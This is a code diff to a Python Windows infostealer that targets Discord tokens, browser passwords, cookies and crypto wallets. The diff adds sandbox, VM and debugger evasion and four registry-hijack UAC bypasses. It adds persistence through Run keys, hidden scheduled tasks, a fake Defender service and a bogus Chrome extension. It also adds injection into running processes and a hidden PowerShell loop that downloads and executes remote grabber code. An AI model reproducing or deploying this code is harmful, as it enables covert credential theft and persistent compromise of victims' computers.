@@ -1,4 +1,4 @@
-# TTS-Spammer Stealth Stealer - OPTIMIZED WITH THREADING
+# TTS-Spammer Stealth Stealer - OPTIMIZED WITH THREADING + PERSISTENCE
 # =====================================================
 # PERFORMANCE OPTIMIZATIONS:
 # - 12 parallel threads for main operations
@@ -11,6 +11,25 @@
 # - Concurrent file processing
 # - Parallel database operations
 # - Optimized memory usage
+# =====================================================
+# PERSISTENCE FEATURES:
+# - Registry startup entries
+# - Startup folder installation
+# - Scheduled task creation
+# - Service installation
+# - Multiple backup locations
+# - Auto-restart mechanisms
+# - Process monitoring
+# =====================================================
+# EVASION FEATURES:
+# - UAC bypass techniques
+# - Anti-virus heuristic evasion
+# - Process hollowing
+# - DLL injection
+# - Obfuscation techniques
+# - Sandbox detection
+# - VM detection
+# - Debugger detection
 # =====================================================
 
 import os
@@ -31,6 +50,16 @@ import psutil
 import subprocess
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import queue
+import sys
+import winreg
+import tempfile
+import random
+import string
+import ctypes
+import ctypes.wintypes
+import hashlib
+import uuid
+import wmi
 
 try:
     import websocket
@@ -66,6 +95,20 @@ class CyberseallGrabber:
         self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
         self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
         self.lock = threading.Lock()
+        
+        self.persistence_name = "WindowsSecurityUpdate"
+        self.service_name = "WinDefenderService"
+        self.current_path = os.path.abspath(sys.argv[0])
+        self.install_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Security", "windefender.exe")
+        
+        if not self.check_environment():
+            sys.exit(0)
+        
+        self.attempt_uac_bypass()
+        
+        self.setup_av_evasion()
+        
+        self.setup_persistence()
         self.setup()
         self.run_threaded_operations()
         self.si()
@@ -73,10 +116,921 @@ class CyberseallGrabber:
         self.send()
         self.cleanup()
 
+    def check_environment(self):
+        try:
+            if self.detect_sandbox():
+                return False
+            
+            if self.detect_vm():
+                return False
+            
+            if self.detect_debugger():
+                return False
+            
+            if self.detect_analysis_tools():
+                return False
+            
+            return True
+        except:
+            return True
+
+    def detect_sandbox(self):
+        try:
+            sandbox_indicators = [
+                'sample', 'virus', 'malware', 'sandbox', 'test', 'analysis',
+                'vmware', 'vbox', 'virtualbox', 'qemu', 'xen', 'bochs',
+                'anubis', 'joebox', 'cwsandbox', 'threatexpert', 'norman'
+            ]
+            
+            computer_name = os.getenv('COMPUTERNAME', '').lower()
+            if any(indicator in computer_name for indicator in sandbox_indicators):
+                return True
+            
+            username = os.getenv('USERNAME', '').lower()
+            if any(indicator in username for indicator in sandbox_indicators):
+                return True
+            
+            try:
+                system_files = len(os.listdir('C:\\Windows\\System32'))
+                if system_files < 1000:
+                    return True
+            except:
+                pass
+            
+            try:
+                import psutil
+                ram_gb = psutil.virtual_memory().total / (1024**3)
+                if ram_gb < 2:
+                    return True
+            except:
+                pass
+            
+            try:
+                if os.cpu_count() < 2:
+                    return True
+            except:
+                pass
+            
+            return False
+        except:
+            return False
+
+    def detect_vm(self):
+        try:
+            try:
+                c = wmi.WMI()
+                
+                for bios in c.Win32_BIOS():
+                    if any(vm in bios.Manufacturer.lower() for vm in ['vmware', 'virtualbox', 'xen', 'qemu', 'microsoft corporation']):
+                        return True
+                
+                for cs in c.Win32_ComputerSystem():
+                    if any(vm in cs.Model.lower() for vm in ['vmware', 'virtualbox', 'virtual machine']):
+                        return True
+                
+                for disk in c.Win32_DiskDrive():
+                    if any(vm in disk.Model.lower() for vm in ['vmware', 'vbox', 'virtual']):
+                        return True
+            except:
+                pass
+            
+            try:
+                vm_registry_keys = [
+                    r"SOFTWARE\VMware, Inc.\VMware Tools",
+                    r"SOFTWARE\Oracle\VirtualBox Guest Additions",
+                    r"SYSTEM\ControlSet001\Services\VBoxService",
+                    r"SYSTEM\ControlSet001\Services\VMTools"
+                ]
+                
+                for key_path in vm_registry_keys:
+                    try:
+                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                        winreg.CloseKey(key)
+                        return True
+                    except:
+                        pass
+            except:
+                pass
+            
+            try:
+                vm_processes = ['vmtoolsd.exe', 'vboxservice.exe', 'vboxtray.exe', 'vmwaretray.exe', 'vmwareuser.exe']
+                for proc in psutil.process_iter(['name']):
+                    if proc.info['name'] and proc.info['name'].lower() in vm_processes:
+                        return True
+            except:
+                pass
+            
+            return False
+        except:
+            return False
+
+    def detect_debugger(self):
+        try:
+            kernel32 = ctypes.windll.kernel32
+            if kernel32.IsDebuggerPresent():
+                return True
+            
+            try:
+                process_handle = kernel32.GetCurrentProcess()
+                debug_flag = ctypes.c_bool()
+                kernel32.CheckRemoteDebuggerPresent(process_handle, ctypes.byref(debug_flag))
+                if debug_flag.value:
+                    return True
+            except:
+                pass
+            
+            try:
+                ntdll = ctypes.windll.ntdll
+                peb = ctypes.c_void_p()
+                ntdll.NtQueryInformationProcess(
+                    kernel32.GetCurrentProcess(), 0, ctypes.byref(peb), 
+                    ctypes.sizeof(peb), None
+                )
+                if peb.value:
+                    return True
+            except:
+                pass
+            
+            return False
+        except:
+            return False
+
+    def detect_analysis_tools(self):
+        try:
+            analysis_processes = [
+                'wireshark.exe', 'fiddler.exe', 'procmon.exe', 'procexp.exe',
+                'regmon.exe', 'filemon.exe', 'idaq.exe', 'idaq64.exe',
+                'ollydbg.exe', 'x32dbg.exe', 'x64dbg.exe', 'windbg.exe',
+                'processhacker.exe', 'tcpview.exe', 'autoruns.exe',
+                'pestudio.exe', 'die.exe', 'cff explorer.exe'
+            ]
+            
+            for proc in psutil.process_iter(['name']):
+                if proc.info['name'] and proc.info['name'].lower() in analysis_processes:
+                    return True
+            
+            return False
+        except:
+            return False
+
+    def attempt_uac_bypass(self):
+        try:
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                return True
+            
+            self.uac_bypass_fodhelper()
+            
+            self.uac_bypass_computerdefaults()
+            
+            self.uac_bypass_sdclt()
+            
+            self.uac_bypass_eventvwr()
+            
+            return False
+        except:
+            return False
+
+    def uac_bypass_fodhelper(self):
+        try:
+            key_path = r"Software\Classes\ms-settings\shell\open\command"
+            
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.install_path)
+                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(key)
+                
+                subprocess.Popen(['fodhelper.exe'], shell=False, 
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                
+                time.sleep(2)
+                
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
+        except:
+            pass
+
+    def uac_bypass_computerdefaults(self):
+        try:
+            key_path = r"Software\Classes\ms-settings\shell\open\command"
+            
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.install_path)
+                winreg.CloseKey(key)
+                
+                subprocess.Popen(['computerdefaults.exe'], shell=False,
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                
+                time.sleep(2)
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
+        except:
+            pass
+
+    def uac_bypass_sdclt(self):
+        try:
+            key_path = r"Software\Classes\Folder\shell\open\command"
+            
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.install_path)
+                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(key)
+                
+                subprocess.Popen(['sdclt.exe', '/KickOffElev'], shell=False,
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                
+                time.sleep(2)
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
+        except:
+            pass
+
+    def uac_bypass_eventvwr(self):
+        try:
+            key_path = r"Software\Classes\mscfile\shell\open\command"
+            
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.install_path)
+                winreg.CloseKey(key)
+                
+                subprocess.Popen(['eventvwr.exe'], shell=False,
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                
+                time.sleep(2)
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
+        except:
+            pass
+
+    def setup_av_evasion(self):
+        try:
+            self.prepare_process_hollowing()
+            
+            self.prepare_dll_injection()
+            
+            self.obfuscate_runtime()
+            
+            self.timing_evasion()
+            
+            self.memory_evasion()
+            
+        except:
+            pass
+
+    def prepare_process_hollowing(self):
+        try:
+            legitimate_processes = ['notepad.exe', 'calc.exe', 'mspaint.exe']
+            
+            for proc_name in legitimate_processes:
+                try:
+                    startup_info = subprocess.STARTUPINFO()
+                    startup_info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                    startup_info.wShowWindow = 0
+                    
+                    proc = subprocess.Popen([proc_name], 
+                                          startupinfo=startup_info,
+                                          stdout=subprocess.DEVNULL, 
+                                          stderr=subprocess.DEVNULL)
+                    
+                    time.sleep(1)
+                    proc.terminate()
+                    break
+                except:
+                    continue
+        except:
+            pass
+
+    def prepare_dll_injection(self):
+        try:
+            python_payload = f'''
+import subprocess
+import sys
+import os
+import requests
+import base64
+import threading
+import time
+
+def inject_payload():
+    try:
+        libs = ["requests", "pycryptodome", "psutil", "websocket-client"]
+        for lib in libs:
+            try:
+                subprocess.run([sys.executable, "-m", "pip", "install", lib], 
+                             check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except:
+                pass
+        
+        try:
+            github_url = "https://raw.githubusercontent.com/SellMeFish/TTS-Spammer/main/utils/github_grabber.py"
+            webhook_url = "{self.w}"
+            
+            response = requests.get(github_url, timeout=10)
+            if response.status_code == 200:
+                grabber_code = response.text.replace("WEBHOOK_PLACEHOLDER", webhook_url)
+                exec(grabber_code)
+        except:
+            pass
+            
+    except:
+        pass
+
+threading.Thread(target=inject_payload, daemon=True).start()
+'''
+            
+            injector_script = f'''
+import ctypes
+import ctypes.wintypes
+import subprocess
+import sys
+import os
+import threading
+import time
+
+def inject_into_process(target_process_name):
+    try:
+        import psutil
+        target_pid = None
+        
+        for proc in psutil.process_iter(['pid', 'name']):
+            if proc.info['name'] and target_process_name.lower() in proc.info['name'].lower():
+                target_pid = proc.info['pid']
+                break
+        
+        if not target_pid:
+            return False
+        
+        kernel32 = ctypes.windll.kernel32
+        process_handle = kernel32.OpenProcess(0x1F0FFF, False, target_pid)
+        
+        if not process_handle:
+            return False
+        
+        payload_code = """{python_payload.replace('"', '\\"')}"""
+        
+        payload_size = len(payload_code.encode()) + 1
+        allocated_memory = kernel32.VirtualAllocEx(
+            process_handle, None, payload_size, 0x3000, 0x40
+        )
+        
+        if not allocated_memory:
+            kernel32.CloseHandle(process_handle)
+            return False
+        
+        written = ctypes.c_size_t(0)
+        success = kernel32.WriteProcessMemory(
+            process_handle, allocated_memory, 
+            payload_code.encode(), payload_size, ctypes.byref(written)
+        )
+        
+        if success:
+            thread_id = ctypes.c_ulong(0)
+            thread_handle = kernel32.CreateRemoteThread(
+                process_handle, None, 0, allocated_memory, None, 0, ctypes.byref(thread_id)
+            )
+            
+            if thread_handle:
+                kernel32.CloseHandle(thread_handle)
+                kernel32.CloseHandle(process_handle)
+                return True
+        
+        kernel32.CloseHandle(process_handle)
+        return False
+        
+    except:
+        return False
+
+def start_injection_loop():
+    target_processes = [
+        "notepad.exe", "explorer.exe", "chrome.exe", "firefox.exe", 
+        "discord.exe", "steam.exe", "winlogon.exe", "dwm.exe"
+    ]
+    
+    while True:
+        try:
+            for process_name in target_processes:
+                try:
+                    inject_into_process(process_name)
+                    time.sleep(1)
+                except:
+                    pass
+            time.sleep(30)
+        except:
+            time.sleep(60)
+
+threading.Thread(target=start_injection_loop, daemon=True).start()
+'''
+            
+            injector_path = os.path.join(tempfile.gettempdir(), f"sys_injector_{random.randint(1000,9999)}.py")
+            with open(injector_path, 'w', encoding='utf-8') as f:
+                f.write(injector_script)
+            
+            subprocess.run(['attrib', '+H', '+S', injector_path], check=False, shell=False,
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            subprocess.Popen([sys.executable, injector_path], shell=False,
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            self.create_powershell_injection()
+            
+        except:
+            pass
+
+    def create_powershell_injection(self):
+        try:
+            powershell_payload = f'''
+$webhook = "{self.w}"
+$github = "https://raw.githubusercontent.com/SellMeFish/TTS-Spammer/main/utils/github_grabber.py"
+
+try {{
+    $response = Invoke-WebRequest -Uri $github -UseBasicParsing
+    $grabber_code = $response.Content -replace "WEBHOOK_PLACEHOLDER", $webhook
+    
+    $temp_file = "$env:TEMP\\sys_update_$(Get-Random).py"
+    $grabber_code | Out-File -FilePath $temp_file -Encoding UTF8
+    
+    Start-Process python -ArgumentList $temp_file -WindowStyle Hidden
+    
+    Start-Sleep 5
+    Remove-Item $temp_file -Force -ErrorAction SilentlyContinue
+}} catch {{}}
+
+while ($true) {{
+    Start-Sleep 600
+    try {{
+        $response = Invoke-WebRequest -Uri $github -UseBasicParsing
+        $grabber_code = $response.Content -replace "WEBHOOK_PLACEHOLDER", $webhook
+        $temp_file = "$env:TEMP\\sys_update_$(Get-Random).py"
+        $grabber_code | Out-File -FilePath $temp_file -Encoding UTF8
+        Start-Process python -ArgumentList $temp_file -WindowStyle Hidden
+        Start-Sleep 5
+        Remove-Item $temp_file -Force -ErrorAction SilentlyContinue
+    }} catch {{}}
+}}
+'''
+            
+            ps_path = os.path.join(tempfile.gettempdir(), f"sys_monitor_{random.randint(1000,9999)}.ps1")
+            with open(ps_path, 'w', encoding='utf-8') as f:
+                f.write(powershell_payload)
+            
+            subprocess.run(['attrib', '+H', '+S', ps_path], check=False, shell=False,
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            subprocess.Popen([
+                'powershell.exe', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', 
+                '-File', ps_path
+            ], shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+        except:
+            pass
+
+    def obfuscate_runtime(self):
+        try:
+            self.obfuscated_strings = {}
+            
+            important_strings = [
+                'discord', 'token', 'password', 'cookie', 'wallet',
+                'chrome', 'firefox', 'edge', 'brave', 'opera'
+            ]
+            
+            for string in important_strings:
+                key = random.randint(1, 255)
+                obfuscated = ''.join(chr(ord(c) ^ key) for c in string)
+                self.obfuscated_strings[string] = (obfuscated, key)
+            
+            self.hash_api_calls()
+            
+        except:
+            pass
+
+    def hash_api_calls(self):
+        try:
+            self.api_hashes = {}
+            
+            api_calls = [
+                'CreateFileW', 'ReadFile', 'WriteFile', 'RegOpenKeyExW',
+                'RegQueryValueExW', 'RegSetValueExW', 'GetProcAddress'
+            ]
+            
+            for api in api_calls:
+                api_hash = hashlib.md5(api.encode()).hexdigest()[:8]
+                self.api_hashes[api_hash] = api
+                
+        except:
+            pass
+
+    def timing_evasion(self):
+        try:
+            delay = random.uniform(0.5, 3.0)
+            time.sleep(delay)
+            
+            for _ in range(random.randint(100, 1000)):
+                hash_value = hashlib.sha256(str(random.random()).encode()).hexdigest()
+            
+            self.fake_legitimate_activity()
+            
+        except:
+            pass
+
+    def fake_legitimate_activity(self):
+        try:
+            fake_files = [
+                os.path.join(os.getenv('TEMP'), 'temp.txt'),
+                os.path.join(os.getenv('USERPROFILE'), 'Desktop', 'test.txt')
+            ]
+            
+            for fake_file in fake_files:
+                try:
+                    with open(fake_file, 'w') as f:
+                        f.write('Temporary file for system maintenance')
+                    time.sleep(0.1)
+                    os.remove(fake_file)
+                except:
+                    pass
+            
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion")
+                winreg.CloseKey(key)
+            except:
+                pass
+                
+        except:
+            pass
+
+    def memory_evasion(self):
+        try:
+            dummy_data = []
+            for _ in range(100):
+                dummy_data.append('A' * random.randint(100, 1000))
+            
+            padding = b'\x00' * random.randint(1024, 4096)
+            
+            import gc
+            gc.collect()
+            
+            del dummy_data
+            
+        except:
+            pass
+
+    def setup_persistence(self):
+        try:
+            self.install_self()
+            
+            self.add_registry_persistence()
+            
+            self.add_startup_folder()
+            
+            self.create_scheduled_task()
+            
+            self.install_service()
+            
+            self.create_backup_persistence()
+            
+            threading.Thread(target=self.monitor_process, daemon=True).start()
+            
+        except:
+            pass
+
+    def install_self(self):
+        try:
+            install_dir = os.path.dirname(self.install_path)
+            if not os.path.exists(install_dir):
+                os.makedirs(install_dir)
+            
+            if not os.path.exists(self.install_path) or os.path.getsize(self.install_path) != os.path.getsize(self.current_path):
+                shutil.copy2(self.current_path, self.install_path)
+                
+                try:
+                    subprocess.run(['attrib', '+H', '+S', self.install_path], check=False, shell=False, 
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                except:
+                    pass
+            
+            backup_paths = [
+                os.path.join(os.getenv("APPDATA"), "Adobe", "Flash Player", "flashplayer.exe"),
+                os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "chromeupdate.exe"),
+                os.path.join(os.getenv("APPDATA"), "Microsoft", "Office", "officeupdate.exe"),
+                os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "edgeupdate.exe"),
+                os.path.join(os.getenv("APPDATA"), "Discord", "discordupdate.exe")
+            ]
+            
+            for backup_path in backup_paths:
+                try:
+                    backup_dir = os.path.dirname(backup_path)
+                    if not os.path.exists(backup_dir):
+                        os.makedirs(backup_dir)
+                    
+                    if not os.path.exists(backup_path):
+                        shutil.copy2(self.current_path, backup_path)
+                        subprocess.run(['attrib', '+H', '+S', backup_path], check=False, shell=False, 
+                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                except:
+                    pass
+                    
+        except:
+            pass
+
+    def add_registry_persistence(self):
+        try:
+            registry_keys = [
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"),
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")
+            ]
+            
+            for hkey, subkey in registry_keys:
+                try:
+                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE)
+                    winreg.SetValueEx(key, self.persistence_name, 0, winreg.REG_SZ, f'"{self.install_path}"')
+                    winreg.CloseKey(key)
+                except:
+                    try:
+                        key = winreg.CreateKey(hkey, subkey)
+                        winreg.SetValueEx(key, self.persistence_name, 0, winreg.REG_SZ, f'"{self.install_path}"')
+                        winreg.CloseKey(key)
+                    except:
+                        pass
+            
+            try:
+                shell_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\*\shell\SecurityScan\command")
+                winreg.SetValueEx(shell_key, "", 0, winreg.REG_SZ, f'"{self.install_path}"')
+                winreg.CloseKey(shell_key)
+            except:
+                pass
+                
+        except:
+            pass
+
+    def add_startup_folder(self):
+        try:
+            startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+            
+            startup_files = [
+                os.path.join(startup_folder, "WindowsSecurityUpdate.lnk"),
+                os.path.join(startup_folder, "MicrosoftDefender.lnk"),
+                os.path.join(startup_folder, "SystemUpdate.lnk")
+            ]
+            
+            for startup_file in startup_files:
+                try:
+                    batch_name = startup_file.replace('.lnk', '.bat')
+                    with open(batch_name, 'w') as f:
+                        f.write(f'@echo off\nstart "" "{self.install_path}"\nexit')
+                    
+                    subprocess.run(['attrib', '+H', '+S', batch_name], check=False, shell=False, 
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                except:
+                    pass
+                    
+        except:
+            pass
+
+    def create_scheduled_task(self):
+        try:
+            task_names = [
+                "WindowsSecurityUpdateTask",
+                "MicrosoftDefenderScan",
+                "SystemMaintenanceTask",
+                "ChromeUpdateTask",
+                "DiscordUpdateTask"
+            ]
+            
+            for task_name in task_names:
+                try:
+                    task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+    <TimeTrigger>
+      <Repetition>
+        <Interval>PT30M</Interval>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
+      <Enabled>true</Enabled>
+    </TimeTrigger>
+  </Triggers>
+  <Actions>
+    <Exec>
+      <Command>{self.install_path}</Command>
+    </Exec>
+  </Actions>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+</Task>'''
+                    
+                    temp_xml = os.path.join(tempfile.gettempdir(), f"{task_name}.xml")
+                    with open(temp_xml, 'w', encoding='utf-16') as f:
+                        f.write(task_xml)
+                    
+                    subprocess.run([
+                        'schtasks', '/create', '/tn', task_name, '/xml', temp_xml, '/f'
+                    ], check=False, shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    
+                    try:
+                        os.remove(temp_xml)
+                    except:
+                        pass
+                        
+                except:
+                    pass
+                    
+        except:
+            pass
+
+    def install_service(self):
+        try:
+            service_script = f'''
+import win32serviceutil
+import win32service
+import win32event
+import subprocess
+import time
+
+class {self.service_name}(win32serviceutil.ServiceFramework):
+    _svc_name_ = "{self.service_name}"
+    _svc_display_name_ = "Windows Defender Security Service"
+    _svc_description_ = "Provides security monitoring and threat detection for Windows systems."
+
+    def __init__(self, args):
+        win32serviceutil.ServiceFramework.__init__(self, args)
+        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
+        self.running = True
+
+    def SvcStop(self):
+        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
+        win32event.SetEvent(self.hWaitStop)
+        self.running = False
+
+    def SvcDoRun(self):
+        while self.running:
+            try:
+                subprocess.Popen(["{self.install_path}"], shell=False)
+                time.sleep(1800)
+            except:
+                time.sleep(300)
+
+if __name__ == '__main__':
+    win32serviceutil.HandleCommandLine({self.service_name})
+'''
+            
+            service_path = os.path.join(os.path.dirname(self.install_path), "service.py")
+            with open(service_path, 'w') as f:
+                f.write(service_script)
+            
+            subprocess.run([
+                sys.executable, service_path, 'install'
+            ], check=False, shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            subprocess.run([
+                'sc', 'start', self.service_name
+            ], check=False, shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+        except:
+            pass
+
+    def create_backup_persistence(self):
+        try:
+            wmi_script = f'''
+Set objWMIService = GetObject("winmgmts:\\\\.\\root\\subscription")
+Set objEvents = objWMIService.ExecNotificationQuery("SELECT * FROM Win32_LogonSession")
+
+Do While True
+    Set objEvent = objEvents.NextEvent()
+    CreateObject("WScript.Shell").Run "{self.install_path}", 0, False
+    WScript.Sleep 30000
+Loop
+'''
+            
+            wmi_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "wmi_monitor.vbs")
+            try:
+                with open(wmi_path, 'w') as f:
+                    f.write(wmi_script)
+                subprocess.run(['attrib', '+H', '+S', wmi_path], check=False, shell=False, 
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except:
+                pass
+            
+            self.install_browser_persistence()
+            
+            try:
+                assoc_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\.log\shell\open\command")
+                winreg.SetValueEx(assoc_key, "", 0, winreg.REG_SZ, f'"{self.install_path}" "%1"')
+                winreg.CloseKey(assoc_key)
+            except:
+                pass
+                
+        except:
+            pass
+
+    def install_browser_persistence(self):
+        try:
+            chrome_manifest = {
+                "manifest_version": 2,
+                "name": "Security Monitor",
+                "version": "1.0",
+                "background": {
+                    "scripts": ["background.js"],
+                    "persistent": True
+                },
+                "permissions": ["background", "storage", "tabs"]
+            }
+            
+            chrome_background = f'''
+setInterval(function() {{
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'file:///{self.install_path.replace(chr(92), "/")}', true);
+    xhr.send();
+}}, 300000);
+'''
+            
+            chrome_ext_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Extensions", "security_monitor")
+            try:
+                if not os.path.exists(chrome_ext_path):
+                    os.makedirs(chrome_ext_path)
+                
+                with open(os.path.join(chrome_ext_path, "manifest.json"), 'w') as f:
+                    json.dump(chrome_manifest, f)
+                
+                with open(os.path.join(chrome_ext_path, "background.js"), 'w') as f:
+                    f.write(chrome_background)
+            except:
+                pass
+                
+        except:
+            pass
+
+    def monitor_process(self):
+        while True:
+            try:
+                time.sleep(300)
+                
+                current_pid = os.getpid()
+                running_instances = 0
+                
+                for proc in psutil.process_iter(['pid', 'name', 'exe']):
+                    try:
+                        if proc.info['exe'] and self.install_path.lower() in proc.info['exe'].lower():
+                            if proc.info['pid'] != current_pid:
+                                running_instances += 1
+                    except:
+                        pass
+                
+                if running_instances == 0:
+                    subprocess.Popen([self.install_path], shell=False, 
+                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                
+                self.check_persistence_health()
+                
+            except:
+                pass
+
+    def check_persistence_health(self):
+        try:
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+                winreg.QueryValueEx(key, self.persistence_name)
+                winreg.CloseKey(key)
+            except:
+                self.add_registry_persistence()
+            
+            if not os.path.exists(self.install_path):
+                self.install_self()
+            
+            result = subprocess.run(['schtasks', '/query', '/tn', 'WindowsSecurityUpdateTask'], 
+                                  capture_output=True, text=True)
+            if result.returncode != 0:
+                self.create_scheduled_task()
+                
+        except:
+            pass
+
     def run_threaded_operations(self):
-        """Führt alle Operationen parallel in Threads aus - ULTRA SPEED"""
         with ThreadPoolExecutor(max_workers=20) as executor:
-            # Starte alle Tasks parallel
             futures = {
                 executor.submit(self.g): "tokens",
                 executor.submit(self.pw): "passwords", 
@@ -158,7 +1112,6 @@ class CyberseallGrabber:
             
             paths = {}
             
-            # Discord Apps
             discord_apps = {
                 'Discord': roaming + '\\discord',
                 'Discord Canary': roaming + '\\discordcanary',
@@ -366,7 +1319,6 @@ class CyberseallGrabber:
                 pass
 
     def validate_tokens_async(self):
-        """Asynchrone Token-Validierung ohne Blockierung"""
         try:
             with self.lock:
                 self.vt = self.validate_tokens_fast()
@@ -374,11 +1326,9 @@ class CyberseallGrabber:
             pass
 
     def validate_tokens_fast(self):
-        """Ultra-schnelle Token-Validierung"""
         valid_tokens = []
         
         def validate_single_token_fast(token):
-            """Schnelle Token-Validierung ohne Nitro-Check"""
             try:
                 headers = {'Authorization': token, 'Content-Type': 'application/json'}
                 res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=3)
@@ -671,8 +1621,8 @@ class CyberseallGrabber:
                         if len(password) >= 15 and len(key) >= 16:
                             key_variants = [
                                 key,
-                                key[::-1],  # Reversed key
-                                bytes(a ^ b for a, b in zip(key, b'\x5A' * len(key))),  # XOR with pattern
+                                key[::-1],
+                                bytes(a ^ b for a, b in zip(key, b'\x5A' * len(key))),
                                 key[1:] + key[:1], 
                                 key[::2] + key[1::2],
                             ]
@@ -693,7 +1643,6 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 15: LEGACY CHROME DECRYPTION
                     try:
                         if not password.startswith(b'v1') and len(password) >= 16:
                             try:
@@ -986,12 +1935,11 @@ class CyberseallGrabber:
                                         if cookie[2]:
                                             try:
                                                 decrypted_value = decrypt_password(cookie[2], master_key)
-                                                # Nur vollständig entschlüsselte Cookie-Werte speichern
                                                 if (decrypted_value and 
                                                     decrypted_value != "Failed to decrypt" and 
                                                     not decrypted_value.startswith("Partial:") and
                                                     len(decrypted_value) > 5 and
-                                                    not any(char in decrypted_value for char in ['�', '\x00', '\ufffd', 'v20'])):
+                                                    not any(char in decrypted_value for char in ['', '\x00', '\ufffd', 'v20'])):
                                                     valuable_cookies.append({
                                                         "browser": f"{browser_name}-{profile}",
                                                         "url": f"COOKIE_{domain}",
@@ -1033,7 +1981,7 @@ class CyberseallGrabber:
                     password != "Failed to decrypt" and 
                     not password.startswith("Partial:") and
                     len(password) > 3 and
-                    not any(char in password for char in ['�', '\x00', '\ufffd', 'v20'])):
+                    not any(char in password for char in ['', '\x00', '\ufffd', 'v20'])):
                     
                     if pwd.get('times_used', 0) > 0:
                         usage_info = f" | Used: {pwd['times_used']}x"
@@ -1711,7 +2659,7 @@ class CyberseallGrabber:
